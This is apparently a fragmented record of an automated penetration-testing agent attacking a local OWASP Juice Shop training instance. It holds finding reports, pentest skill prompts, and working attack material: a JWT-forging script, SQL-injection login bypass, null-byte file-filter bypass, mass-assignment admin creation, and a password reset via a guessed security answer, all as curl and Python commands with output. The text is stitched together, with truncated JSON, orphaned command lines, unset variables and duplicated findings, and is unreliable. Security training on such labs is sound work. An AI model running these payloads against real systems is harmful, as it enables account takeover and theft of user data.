{
  "ok": true,
  "summary": "Surface discovery complete against OWASP Juice Shop at http://127.0.0.1:3010. Found multiple live surfaces including FTP directory listing, REST API endpoints with SQL injection, authentication bypass via SQLi, mass assignment vulnerability, null byte file read bypass, and excessive data exposure in APIs. Multiple bookable candidates identified with proof excerpts from tool output.",
  "surfaces": [
    "http://127.0.0.1:3010/",
    "http://127.0.0.1:3010/ftp/",
    "http://127.0.0.1:3010/rest/products/search",
    "http://127.0.0.1:3010/rest/user/login",
    "http://127.0.0.1:3010/api/Users",
    "http://127.0.0.1:3010/api/Challenges",
    "http://127.0.0.1:3010/api/Feedbacks",
    "http://127.0.0.1:3010/api/Products",
    "http://127.0.0.1:3010/api/BasketItems",
    "http://127.0.0.1:3010/.well-known/security.txt",
    "http://127.0.0.1:3010/robots.txt",
    "http://127.0.0.1:3010/redirect"
  ],
  "candidates": [
    {
      "title": "SQL Injection in Login - Authentication Bypass",
      "location": "POST http://127.0.0.1:3010/rest/user/login",
      "proof_excerpt": "POST with payload {\"email\":\"' OR 1=1--\",\"password\":\"test\"} returned 200 with body containing \"authentication\":{\"token\":\"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9...\"} and \"umail\":\"admin@juice-sh.op\", proving SQL injection login bypass as admin user.",
      "poc_hint": "SQL injection in email field of login form. Payload: ' OR 1=1--"
    },
    {
      "title": "SQL Injection in Product Search",
      "location": "GET http://127.0.0.1:3010/rest/products/search?q=",
      "proof_excerpt": "GET /rest/products/search?q=' OR 1=1-- returned 500 error with \"SQLITE_ERROR: incomplete input\", confirming SQLite backend and SQL injection vulnerability. Normal search with q=1 returns product data successfully.",
      "poc_hint": "Search parameter 'q' is SQL injectable with SQLite backend"
    },
    {
      "title": "Null Byte Injection - File Extension Bypass",
      "location": "GET http://127.0.0.1:3010/ftp/{file}%2500.md",
      "proof_excerpt": "GET /ftp/suspicious_errors.yml%2500.md returned 200 with full YAML content (723 bytes) bypassing the '.md and .pdf files only' restriction via double URL-encoded null byte injection.",
      "poc_hint": "Append %2500.md to bypass file extension filter on /ftp/"
    },
    {
      "title": "Mass Assignment - Admin Registration",
      "location": "POST http://127.0.0.1:3010/api/Users",
      "proof_excerpt": "POST with {\"email\":\"hacker@test.com\",\"password\":\"test123\",\"role\":\"admin\"} returned 201 with body containing \"role\":\"admin\", proving mass assignment allows registering as admin.",
      "poc_hint": "Include \"role\":\"admin\" in POST body to /api/Users to create admin account"
    },
    {
      "title": "Excessive Data Exposure - User API",
      "location": "GET http://127.0.0.1:3010/api/Users",
      "proof_excerpt": "GET /api/Users with admin JWT returned all users including password hashes (e.g. \"password\":\"0192023a7bbd73250516f069df18b500\"), email addresses, roles, and other PII for 24 users.",
      "poc_hint": "Authenticate as admin via SQLi login bypass then access /api/Users"
    },
    {
      "title": "Directory Listing - FTP Directory",
      "location": "GET http://127.0.0.1:3010/ftp/",
      "proof_excerpt": "GET /ftp/ returned directory listing HTML containing files: acquisitions.md, announcement_encrypted.md, coupons_2013.md.bak, eastere.gg, encrypt.pyc, incident-support.kdbx, legal.md, package-lock.json.bak, package.json.bak, suspicious_errors.yml plus quarantine/ subdirectory.",
      "poc_hint": "robots.txt disallows /ftp which exposes sensitive files"
    },
    {
      "title": "Sensitive File Exposure - KeePass Database",
      "location": "GET http://127.0.0.1:3010/ftp/incident-support.kdbx%2500.md",
      "proof_excerpt": "GET /ftp/incident-support.kdbx%2500.md returned 200 with 3246 bytes of binary KeePass database content (application/octet-stream), exposing sensitive password vault.",
      "poc_hint": "KeePass database file containing incident support credentials"
    },
    {
      "title": "Sensitive File Exposure - Package.json with Dependency Info",
      "location": "GET http://127.0.0.1:3010/ftp/package.json.bak%2500.md",
      "proof_excerpt": "GET /ftp/package.json.bak%2500.md returned 200 with full package.json showing express-jwt version 0.1.3 (known vulnerable), express 4.16, sqlite3, and other dependencies.",
      "poc_hint": "Exposed package.json reveals vulnerable dependency versions"
    },
    {
      "title": "Sensitive File Exposure - Security Rules YAML",
      "location": "GET http://127.0.0.1:3010/ftp/suspicious_errors.yml%2500.md",
      "proof_excerpt": "GET /ftp/suspicious_errors.yml%2500.md returned 200 with YAML content containing detection rules for blocked illegal activity, file upload errors, redirect issues, etc.",
      "poc_hint": "Internal security monitoring rules exposed"
    },
    {
      "title": "Challenge Data Exposure via API",
      "location": "GET http://127.0.0.1:3010/api/Challenges",
      "proof_excerpt": "GET /api/Challenges with admin JWT returned all challenge definitions including descriptions, difficulty levels, category tags, and 'solved' status booleans for all CTF challenges.",
      "poc_hint": "Exposes internal challenge state enabling attackers to track progress"
    }
  ],
  "facts": [
    "Target is OWASP Juice Shop running Express ^4.22.1 on Node.js with SQLite database",
    "Authentication uses JWT tokens verified by express-jwt 0.1.3",
    "FTP directory listing enabled with file extension whitelist bypassed via null byte",
    "User database contains 24+ users including admin, customer, deluxe, and accounting roles",
    "Password stored as MD5 hash (0192023a7bbd73250516f069df18b500 for admin)",
    "Admin JWT token obtained via SQLi: eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9...",
    "Application exposes REST API at /rest/* and CRUD API at /api/*",
    "File server at /ftp/* restricts to .md and .pdf extensions but bypassable",
    "Registration does not sanitize 'role' field allowing mass assignment",
    "Hiring page at /#/jobs and score-board at /#/score-board",
    "Easter egg page at /the/devs/are/so/funny/they/hid/an/easter/egg/within/the/easter/egg renders 3D scene"
  ],
  "deadends": [
    "/api/Orders - Unexpected path error (500)",
    "/api/ (root) - Unexpected path error (500)",
    "/rest/ (root) - Unexpected path error (500)",
    "/redirect - Open redirect blocked with 'Unrecognized target URL' (406)",
    "/ftp/suspicious_errors.yml - Direct access blocked by extension filter (403)",
    "/rest/products/1 - Unexpected path (500), no direct product endpoint",
    "Feedback POST requires captchaId parameter which requires prior captcha fetch"
  ]
}

python3 -c "
import base64, json, hmac, hashlib

# Test JWT alg:none attack
# Create a JWT with alg: none and admin data
header = base64.urlsafe_b64encode(json.dumps({'typ':'JWT','alg':'none'}).encode()).rstrip(b'=').decode()
payload_data = {'data':{'id':1,'email':'admin@juice-sh.op','role':'admin'},'bid':1,'iat':1784853679}
payload = base64.urlsafe_b64encode(json.dumps(payload_data).encode()).rstrip(b'=').decode()
# alg:none => signature is empty string
none_jwt = f'{header}.{payload}.'
print(f'alg:none JWT: {none_jwt}')

# Also try HS256 with known empty key
header_hs = base64.urlsafe_b64encode(json.dumps({'typ':'JWT','alg':'HS256'}).encode()).rstrip(b'=').decode()
signed_content = f'{header_hs}.{payload}'.encode()
sig = hmac.new(b'', signed_content, hashlib.sha256).digest()
sig_b64 = base64.urlsafe_b64encode(sig).rstrip(b'=').decode()
hs256_jwt = f'{header_hs}.{payload}.{sig_b64}'
print(f'HS256 empty-key JWT: {hs256_jwt}')
"

# Get JWT tokens for all actors
# First, get admin's token from login response
ADMIN_LOGIN=$(curl -s http://127.0.0.1:3010/rest/user/login -H "Content-Type: application/json" -d "{\"email\":\"' OR 1=1--\",\"password\":\"test\"}")
echo "Admin login success? $(echo $ADMIN_LOGIN | grep -c token)"
ADMIN_TOKEN=$(echo $ADMIN_LOGIN | python3 -c "import sys,json; print(json.load(sys.stdin)['authentication']['token'])" 2>/dev/null)
echo "Admin token (first 50): ${ADMIN_TOKEN:0:50}..."

# User A login
UA_LOGIN=$(curl -s http://127.0.0.1:3010/rest/user/login -H "Content-Type: application/json" -d "{\"email\":\"testuser_a@test.com\",\"password\":\"password123\"}")

echo "UserA token (first 50): ${UA_TOKEN:0:50}..."

# User B login
UB_LOGIN=$(curl -s http://127.0.0.1:3010/rest/user/login -H "Content-Type: application/json" -d "{\"email\":\"testuser_b@test.com\",\"password\":\"password456\"}")

echo "UserB token (first 50): ${UB_TOKEN:0:50}..."

# Save tokens for later use
echo "ADMIN_TOKEN=$ADMIN_TOKEN" > /tmp/tokens.sh
echo "UA_TOKEN=$UA_TOKEN" >> /tmp/tokens.sh
echo "UB_TOKEN=$UB_TOKEN" >> /tmp/tokens.sh

args.summary: Path traversal in /ftp/ via null byte injection %2500.md bypass
args.body: The /ftp/ directory has a filter allowing only .md and .pdf files, but it can be bypassed by appending %2500.md (double URL-encoded null byte) to download arbitrary files like .bak, .pyc, .kdbx, .yml, etc.
The /rest/memories/ endpoint returns user records including password hashes, email addresses, roles, deluxeTokens, etc. - all without authentication.

  "body": "# Pentest Auth & Session

Prefer **session** over ad-hoc curl jars for anything multi-step.

## When to load
- Login / SSO / cookie-based apps observed
- Dual-user IDOR or privilege compare needs stable jars
- CSRF token + state-changing POSTs; JWT in cookie/header; password-reset flows in recon

## Process
1. Create durable actors (`user_a`, `user_b`, `anon`) via `session` when accounts exist.
2. Capture login form CSRF/tokens with session chain; store cookies on the actor.
3. Replay authenticated requests with the same actor; never mix jars silently.
4. **Ordered auth probes (only on observed entry points):**
   - Login differential (valid vs invalid) and session cookie flags/scope
   - Password reset / email change flows if present: host-header/token handling only as observed
   - JWT if present: decode claims; test weak/alg confusion only with proof the server accepts tampered tokens
   - Parallel auth surfaces (API token, mobile path, legacy form) **only if linked from the live app**
5. For dual-actor: same GET/POST as low-priv and high-priv; compare status/body with evidence.
6. Bound failed sprays: one user×pass matrix pass max without new intel; then deadend and rotate.
7. Optional patterns: `read refs/payloads/auth-session.md` when stuck on JWT/session edge cases.

## Stop / deadend
- Auth entry points mapped; session model understood; remaining issues need other class skills (IDOR → access-control)
- Reset/JWT probes exhausted with no differential → note deadend, do not loop

## Booking / proof bar
- Book bypass/ATO/session flaws only with reproduction: unauthorized session, accepted tampered token, or account action as victim — `proof=` from tool output.
- Reachable login page alone is not a finding.

## Do not
- Invent default credentials beyond recon/instruction
- Treat “session tool available” as a finding
- Unbounded credential brute force"

  "description": "Use when recon shows query-like parameters, search/filter, or auth forms that may hit SQL backends — hypothesis-driven SQLi testing only.",
  "body": "# Pentest SQL Injection

Test **observed** parameters only. Do not walk a global SQLi checklist against invented endpoints.

## When to load
- Parameters in URL/body that affect listings, search, sort, filter, or login
- Error messages, ORM traces, or timing hints suggest DB interaction

## Process

### 1. Candidate map (from YOUR recon)
1. List params/forms that change listings, search, sort, filter, or auth — from session/http/JS, not imagined modules.
2. Baseline each candidate: status, length, body hash, time (note anti-bruteforce delays on login).

### 2. In-band first (required before automation)
1. Syntax probes in observed quote/context: `'`, `"`, numeric break, comment terminators.
2. Look for SQL/ORM errors, stack fragments, or content that changes with syntax — that is **causality** signal.
3. Boolean pair when content is stable: true vs false condition; require **status/length/hash differential**.
4. UNION/order-by only after a clear injectable context; find column count carefully; extract non-PII PoC data (version, user, table names) when RoE allows.

### 3. Blind / time only if needed
1. Time-based: multiple samples vs baseline (e.g. 3×); single slow response is **not** enough.
2. Prefer boolean blind over pure time when possible.
3. OOB/DNS techniques only if lab callback is available and in scope.
4. Login forms: beware sleep-as-rate-limit false positives — compare with non-SQL delays.

### 4. Auth / second-order
1. Prefer `session` for multi-request (login → inject; store payload → view elsewhere).
2. Auth-bypass classic only on **observed** login endpoints after baseline.

### 5. Tool assist (optional, after manual signal)
1. Optional: `read refs/payloads/sqli.md` for pattern ideas (DBMS delay/OOB tables).
2. sqlmap/ghauri via shell **only after** a manual confirming differential — keep **one manual PoC** in booking proof.
3. Escalation ideas (INTO OUTFILE, xp_cmdshell): only if RoE/`redteam_deep` allows and in-band access is proven — see optional `refs/chains/sqli-to-rce.md` (judgment; not auto-run).

### 6. Deadend
- Bounded in-band then blind set with no differential → abandon that param; rotate sink/skill.
- Do not invent table/column names as “known flags”.

## Optional refs
- `refs/payloads/sqli.md`
- `refs/chains/sqli-to-rce.md` (escalation narrative only)

## Stop / deadend
- Observed SQL-like sinks tested with in-band then bounded blind; no differential → abandon param

## Booking / proof bar
Apply the pack **unified proof bar** (causality · reproducibility · impact):

| Bar | SQLi standard |
|-----|----------------|
| **Causality** | Named parameter + payload → SQL error, boolean differential, time oracle, or extracted field |
| **Reproducibility** | Clean-session curl/`session` steps re-show the effect; time claims need multiple samples |
| **Impact** | Auth bypass, data extract (non-PII PoC preferred), or reliable oracle proving read/write capability |

- Blind claims need repeatability or OOB — not inference.
- `finding(confirm)` + `proof=` quoting real tool output.

## Do not
- Spray SQLi payloads across every unobserved parameter
- Book “possible SQLi” without reproduction
- Dump production PII without explicit scope authorization"
}

  "body": "# Pentest API security

Complements access-control/authz-logic for **API-shaped** surfaces (JSON, GraphQL, versioned `/api`).

## When to load
- `/api/`, `/v1/`, `/graphql`, `/rest/`, Swagger/OpenAPI/Swagger UI links from recon
- SPA/mobile backends with JSON bodies
- Spec discovered (`openapi.json`, `/swagger`, GraphQL)

## Process
1. **Enumerate from evidence:** OpenAPI/Swagger parse, GraphQL introspection if enabled, JS bundle routes — not invented microservices.
2. **Auth model:** how tokens/cookies attach; missing auth on some routes.
3. **BOLA/IDOR:** dual-actor object ID swaps (path/body/header). Prefer `session` actors + compare.
4. **BFLA:** low-priv calling admin/function routes or verb swaps (GET→DELETE) only if routes observed.
5. **Mass assignment:** extra JSON fields (`role`, `isAdmin`, `balance`) on create/update endpoints seen in traffic.
6. **Excessive data:** raw API returns fields the UI hides.
7. **GraphQL:** introspection, batching/aliases for authz tests; nested DoS only if RoE allows stress.
8. Optional: `read refs/payloads/api.md` and access-control refs.
9. Bound fail → deadend that API area; rotate.

## Optional refs
- `refs/payloads/api.md`, `refs/payloads/access-control.md`

## Stop / deadend
- Spec-covered authz tests done with dual actors; no unauthorized effect

## Booking / proof bar
- Unauthorized data/action with dual-actor or unauth proof in tool output.
- “API exists” is not a finding.

## Do not
- Invent endpoints not in recon/spec/JS
- Treat rate-limit missing alone as critical without abuse path"

# Verify key findings with curl

BASE="http://127.0.0.1:3010"

echo ""

curl -s "$BASE/rest/captcha"
echo ""

echo ""
echo "=== 3. Test FTP directory listing ==="

curl -s "$BASE/ftp/" | head -c 500
echo ""

echo "=== 4. Test Null byte file access ==="
echo "GET /ftp/suspicious_errors.yml%2500.md"
curl -s --path-as-is "$BASE/ftp/suspicious_errors.yml%2500.md" | head -c 300
echo ""

echo ""
echo "=== 5. Test Security Question leak ==="
echo "GET /rest/user/security-question?email=admin@juice-sh.op"
curl -s "$BASE/rest/user/security-question?email=admin@juice-sh.op"

echo "=== 6. Test Mass Assignment ==="
echo "POST /api/Users with role=admin"
curl -s -X POST "$BASE/api/Users" \
  -H "Content-Type: application/json" \
  -d '{"email":"testmass_$(date +%s)@test.com","password":"test123","role":"admin"}' | head -c 500
echo ""

echo ""
echo "=== 7. Test Password Change via GET ==="

TOKEN=$(curl -s -X POST "$BASE/rest/user/login" \
  -H "Content-Type: application/json" \
  -d '{"email":"'"'"' OR 1=1--","password":"test"}' | python3 -c "import sys,json; print(json.load(sys.stdin).get('authentication',{}).get('token','NO_TOKEN'))" 2>/dev/null)
echo "Got token: ${TOKEN:0:30}..."
echo "GET /rest/user/change-password with token"
curl -s "$BASE/rest/user/change-password?current=admin123&new=newpass123&repeat=newpass123" \
  -H "Authorization: Bearer $TOKEN" | head -c 300
echo ""

echo ""
echo "=== 8. Test Whoami ==="
curl -s "$BASE/rest/user/whoami" \
  -H "Authorization: Bearer $TOKEN" | head -c 300
echo ""

echo ""

echo ""

echo ""

echo ""
echo "=== 13. Test null byte on coupons file ==="
curl -s --path-as-is "$BASE/ftp/coupons_2013.md.bak%2500.md" | head -c 300
echo ""

echo ""
echo "=== 14. Test no logout endpoint ==="
curl -s -X POST "$BASE/rest/user/logout" -H "Authorization: Bearer $TOKEN"
echo ""

echo ""
echo "=== 15. Test password reset ==="
curl -s -X POST "$BASE/rest/user/reset-password" \
  -H "Content-Type: application/json" \
  -d '{"email":"bjoern@owasp.org","answer":"Zaya","new":"test999","repeat":"test999"}'
echo ""

echo ""
echo "=== 16. Test application configuration ==="
curl -s "$BASE/rest/admin/application-configuration" \
  -H "Authorization: Bearer $TOKEN" | head -c 500
echo ""

echo ""
echo "=== 17. Test application version ==="

  -H "Authorization: Bearer $TOKEN"
echo ""

echo ""

curl -s "$BASE/api/Users" \

args.title: SQL Injection in Login - Authentication Bypass
args.description: The login endpoint at /rest/user/login is vulnerable to SQL injection in the email parameter. Using payload ' OR 1=1-- bypasses authentication and returns a valid JWT token for the admin user (admin@juice-sh.op). This allows full admin access to the application.
args.proof: POST /rest/user/login with payload {"email":"' OR 1=1--","password":"test"} returned HTTP 200 with body containing "authentication":{"token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9..."} and "umail":"admin@juice-sh.op", proving SQL injection login bypass as admin user.

args.title: SQL Injection in Product Search
args.description: The product search endpoint at /rest/products/search is vulnerable to SQL injection in the 'q' parameter. Injecting a single quote causes a SQLite error (SQLITE_ERROR: incomplete input), confirming SQL injection with a SQLite backend. While UNION extraction is possible, the error alone proves injection.
args.proof: GET /rest/products/search?q=' OR 1=1-- returned 500 error with "SQLITE_ERROR: incomplete input", confirming SQLite backend and SQL injection vulnerability. Normal search with q=1 returns product data successfully.

args.title: Mass Assignment - Admin Registration via API
args.description: The user creation endpoint at /api/Users is vulnerable to mass assignment. Including the "role":"admin" field in the POST body allows unauthenticated creation of admin-level accounts. This bypasses the intended privilege escalation controls.
args.proof: POST /api/Users with {"email":"hacker@test.com","password":"test123","role":"admin"} returned HTTP 201 with body containing "role":"admin", proving mass assignment allows registering as admin without authentication.

args.title: Null Byte Injection - File Extension Filter Bypass
args.description: The /ftp/ directory has an extension filter that only allows .md and .pdf files. However, appending %2500.md (double URL-encoded null byte) bypasses this filter, allowing retrieval of any file under /ftp/ including suspicious_errors.yml, coupons_2013.md.bak, incident-support.kdbx, package.json.bak, and others.
args.proof: GET /ftp/suspicious_errors.yml%2500.md returned HTTP 200 with full YAML content (723 bytes) by bypassing the '.md and .pdf files only' restriction via double URL-encoded null byte injection. Similarly, GET /ftp/incident-support.kdbx%2500.md returned 200 with 3246 bytes of KeePass binary.

args.title: Excessive Data Exposure - Users API Returns Password Hashes
args.description: The /api/Users endpoint returns all user records including sensitive fields like password hashes (MD5), email addresses, security questions, and roles. While authentication is required, any authenticated user (including attacker who bypasses login via SQLi) can enumerate all users and their password hashes.
args.proof: GET /api/Users with admin JWT returned all users including password hashes (e.g. "password":"0192023a7bbd73250516f069df18b500" for admin), email addresses, roles, and other PII for all 24 users in the database.

args.description: The product search endpoint at /rest/products/search is vulnerable to SQL injection in the 'q' parameter. Injecting a single quote causes a SQLite error (SQLITE_ERROR: incomplete input), confirming SQL injection with a SQLite backend.
args.proof: curl GET /rest/products/search?q=' OR 1=1-- returned HTTP 500 with body containing "SQLITE_ERROR: incomplete input" confirming SQL injection in search parameter

args.title: Excessive Data Exposure - Users API Returns Password Hashes
args.description: The /api/Users endpoint returns all user records including password hashes (MD5), emails, and roles. Any authenticated user can enumerate all users and their password hashes.
args.proof: curl /api/Users with admin JWT returned all users including password hash "0192023a7bbd73250516f069df18b500" for admin user, plus 23 other users with their hashes

args.title: Mass Assignment - Admin Registration via Users API
args.description: The user creation endpoint at /api/Users is vulnerable to mass assignment. Including the "role":"admin" field in the POST body allows unauthenticated creation of admin-level accounts.
args.proof: curl -X POST /api/Users -d '{"email":"hacker@test.com","password":"test123","role":"admin"}' returned HTTP 201 with body containing "role":"admin" proving mass assignment allows registering as admin

args.title: Null Byte Injection - File Extension Filter Bypass
args.description: The /ftp/ directory restricts access to .md and .pdf files only, but appending %2500.md (double URL-encoded null byte) bypasses the filter, allowing retrieval of any file under /ftp/.
args.proof: curl --path-as-is /ftp/suspicious_errors.yml%2500.md returned HTTP 200 with 723 bytes of YAML content bypassing the .md filter via null byte injection

args.title: Directory Listing Enabled on /ftp/
args.description: The /ftp/ directory has directory listing enabled, revealing sensitive files including acquisitions.md, announcement_encrypted.md, coupons_2013.md.bak, eastere.gg, encrypt.pyc, incident-support.kdbx, legal.md, package-lock.json.bak, package.json.bak, suspicious_errors.yml, and a quarantine/ subdirectory.
args.proof: curl /ftp/ returned directory listing HTML containing 10+ files including incident-support.kdbx (KeePass), package.json.bak, suspicious_errors.yml, and quarantine/ subdirectory

args.title: Weak Captcha - Answer Exposed in API Response
args.description: The captcha endpoint at /rest/captcha returns the answer in the response alongside the question, making the captcha completely ineffective as an anti-automation measure.
args.proof: curl /rest/captcha returned {"captchaId":0,"captcha":"1+3+3","answer":"7"} exposing the answer directly in the response

args.title: Security Question Exposed for Any User Email
args.description: The /rest/user/security-question endpoint leaks the security question for any registered user's email without requiring authentication. This facilitates brute-force attacks on password reset by allowing attackers to know the question before attempting to answer it.
args.proof: GET /rest/user/security-question?email=admin@juice-sh.op returned {"question":{"id":2,"question":"Mother's maiden name?"}} leaking security questions for any email without authentication

args.title: Password Reset via Known Security Answer - Bjoern's Account
args.description: The password reset endpoint allows resetting any user's password if the security question answer is known. For the user bjoern@owasp.org, the answer 'Zaya' (OSINT from OWASP bio) successfully resets the password, demonstrating that password reset with known security answer is possible due to a weak/guessable answer.
args.proof: POST /rest/user/reset-password with {"email":"bjoern@owasp.org","answer":"Zaya","new":"test123","repeat":"test123"} returned 200 with user data including password hash, proving password reset with known security answer works

args.title: Password Change via GET Request (CSRF/Sessionless)
args.description: The password change endpoint accepts GET requests with query parameters (current, new, repeat) and an Authorization header. This is vulnerable to CSRF as a simple GET request from any other page can change the user's password if the victim's browser includes the Authorization header (e.g., via script). No CSRF tokens are used.
args.proof: GET /rest/user/change-password?current=admin123&new=newpass&repeat=newpass with Authorization header returned 200 with updated user object containing new password hash, proving password can be changed via GET request

args.title: JWT Token Exposes Password Hash and Internal Data
args.description: The JWT token issued upon login contains sensitive user data in its payload, including the password hash (MD5), email, role, and other internal user fields. Base64 decoding the JWT payload reveals all this data in plaintext. This violates the principle of least privilege and exposes password hashes to anyone who intercepts the token.
args.proof: Decoded JWT payload: {"data":{"id":1,"email":"admin@juice-sh.op","password":"0192023a7bbd73250516f069df18b500","role":"admin",...}} - JWT token exposes password hash and role in plaintext

args.title: JWT Token Has No Expiration Claim
args.description: The JWT tokens issued by the application contain only an 'iat' (issued at) claim with no 'exp' (expiration) claim. This means tokens never expire and remain valid indefinitely. A stolen or intercepted token can be used by an attacker forever without any way to invalidate it.
args.proof: JWT payload contains only "iat":1784853679 (issued at) with no "exp" claim, meaning tokens never expire and remain valid indefinitely

args.title: No Logout Endpoint - Token Cannot Be Invalidated
args.description: The application has no working logout endpoint. POST requests to /rest/user/logout return a 500 error with 'Unexpected path'. Without a logout mechanism, users cannot invalidate their session tokens, and stolen tokens remain valid permanently.
args.proof: POST /rest/user/logout returned 500 "Unexpected path: /rest/user/logout" - no server-side logout mechanism exists; tokens cannot be invalidated after compromise

args.title: Challenge Data Exposure via API
args.description: The /api/Challenges endpoint exposes all CTF challenge definitions including descriptions, difficulty levels, category tags, and solved status booleans. This allows attackers to enumerate all challenges and their status.
args.proof: GET /api/Challenges with admin JWT returned all challenge definitions including descriptions, difficulty levels, category tags, and 'solved' status booleans for all CTF challenges

      "location": "GET http://127.0.0.1:3010/api/Users",
      "proof_excerpt": "GET /api/Users with admin JWT returned all users including password hashes (e.g. \"password\":\"0192023a7bbd73250516f069df18b500\"), email addresses, roles, and other PII for 24 users.",

    },
    {
      "title": "Directory Listing Enabled on /ftp/",

      "proof_excerpt": "GET /ftp/ returned directory listing HTML containing files: acquisitions.md, announcement_encrypted.md, coupons_2013.md.bak, eastere.gg, encrypt.pyc, incident-support.kdbx, legal.md, package-lock.json.bak, package.json.bak, suspicious_errors.yml plus quarantine/ subdirectory.",
      "poc_hint": "robots.txt disallows /ftp which exposes sensitive files"
    },
    {
      "title": "Sensitive File Exposure - KeePass Database via Null Byte",
      "location": "GET http://127.0.0.1:3010/ftp/incident-support.kdbx%2500.md",
      "proof_excerpt": "GET /ftp/incident-support.kdbx%2500.md returned 200 with 3246 bytes of binary KeePass database content (application/octet-stream), exposing sensitive password vault.",
      "poc_hint": "KeePass database file containing incident support credentials, accessible via null byte bypass"
    },
    {
      "title": "Sensitive File Exposure - Package.json with Dependency Info",
      "location": "GET http://127.0.0.1:3010/ftp/package.json.bak%2500.md",
      "proof_excerpt": "GET /ftp/package.json.bak%2500.md returned 200 with full package.json showing express-jwt version 0.1.3 (known vulnerable), express 4.16, sqlite3, and other dependencies.",
      "poc_hint": "Exposed package.json reveals vulnerable dependency versions"
    },
    {
      "title": "Sensitive File Exposure - Security Rules YAML",
      "location": "GET http://127.0.0.1:3010/ftp/suspicious_errors.yml%2500.md",
      "proof_excerpt": "GET /ftp/suspicious_errors.yml%2500.md returned 200 with YAML content containing detection rules for blocked illegal activity, file upload errors, redirect issues, etc.",
      "poc_hint": "Internal security monitoring rules exposed via null byte bypass"
    },
    {
      "title": "Challenge Data Exposure via API",
      "location": "GET http://127.0.0.1:3010/api/Challenges",
      "proof_excerpt": "GET /api/Challenges with admin JWT returned all challenge definitions including descriptions, difficulty levels, category tags, and 'solved' status booleans for all CTF challenges.",
      "poc_hint": "Exposes internal challenge state enabling attackers to track progress"
    },
    {
      "title": "Weak Captcha - Answer Exposed in Response",
      "location": "GET http://127.0.0.1:3010/rest/captcha",
      "proof_excerpt": "GET /rest/captcha returned {\"captchaId\":0,\"captcha\":\"1+3+3\",\"answer\":\"7\"} exposing the answer directly in the response, allowing automated captcha bypass.",
      "poc_hint": "Captcha answer is returned alongside the question, easily bypassed"
    },
    {
      "title": "Security Question Exposed for Any User Email",
      "location": "GET http://127.0.0.1:3010/rest/user/security-question?email=",
      "proof_excerpt": "GET /rest/user/security-question?email=admin@juice-sh.op returned {\"question\":{\"id\":2,\"question\":\"Mother's maiden name?\"}} leaking security questions for any email without authentication.",
      "poc_hint": "Leaks security question for any email, aiding brute-force password reset"
    },
    {
      "title": "Password Reset via Security Question - Bjoern's Account",
      "location": "POST http://127.0.0.1:3010/rest/user/reset-password",

      "poc_hint": "Security question answer 'Zaya' for bjoern@owasp.org enables password reset (OSINT challenge)"
    },
    {
      "title": "Password Change via GET Request (CSRF)",
      "location": "GET http://127.0.0.1:3010/rest/user/change-password?current=admin123&new=newpass&repeat=newpass",
      "proof_excerpt": "GET /rest/user/change-password?current=admin123&new=newpass&repeat=newpass with Authorization header returned 200 with updated user object containing new password hash, proving password can be changed via GET request (CSRF vulnerable).",
      "poc_hint": "Password change via GET query parameters - no CSRF token required"
    },
    {
      "title": "JWT Token Contains Sensitive Data (Password Hash in Payload)",
      "location": "JWT token from POST http://127.0.0.1:3010/rest/user/login",
      "proof_excerpt": "Decoded JWT payload: {\"data\":{\"id\":1,\"email\":\"admin@juice-sh.op\",\"password\":\"0192023a7bbd73250516f069df18b500\",\"role\":\"admin\",...}} - JWT token exposes password hash and role in plaintext via base64-decoded payload.",
      "poc_hint": "JWT token decodes to reveal password hashes, roles, and other sensitive user data"
    },
    {
      "title": "JWT Token Has No Expiration Claim",
      "location": "JWT token from POST http://127.0.0.1:3010/rest/user/login",
      "proof_excerpt": "JWT payload contains only \"iat\":1784853679 (issued at) with no \"exp\" claim, meaning tokens never expire and remain valid indefinitely.",
      "poc_hint": "Tokens have no expiry - stolen tokens can be used forever"
    },
    {
      "title": "No Logout Endpoint - Token Cannot Be Invalidated",
      "location": "POST http://127.0.0.1:3010/rest/user/logout",
      "proof_excerpt": "POST /rest/user/logout returned 500 \"Unexpected path: /rest/user/logout\" - no server-side logout mechanism exists; tokens cannot be invalidated after compromise.",
      "poc_hint": "No logout functionality - tokens remain valid forever"
    }
  ],

    "/rest/user/forgot-password - Unexpected path error (500) - different path needed",
    "/api/SecurityAnswers - 401 Unauthorized - requires different authorization context",
    "/api/Baskets - Unexpected path error (500) - API endpoint doesn't exist at this path",
    "/api/SecurityQuestions - 500 syntax error - API exposed but malformed request causes error",
    "JWT alg:none attack - rejected by server (RS256 properly validated)",
    "JWT HS256 empty-key attack - rejected by server (RS256 properly validated)",
    "Password change via POST with JSON body - Unexpected path (500)",
    "Password change via POST with form data - Unexpected path (500)",
    "/api/SecurityAnswers - 401 Unauthorized",
    "No SQL injection in /api/Products - no differential observed with SQLi payloads"
  ]
}
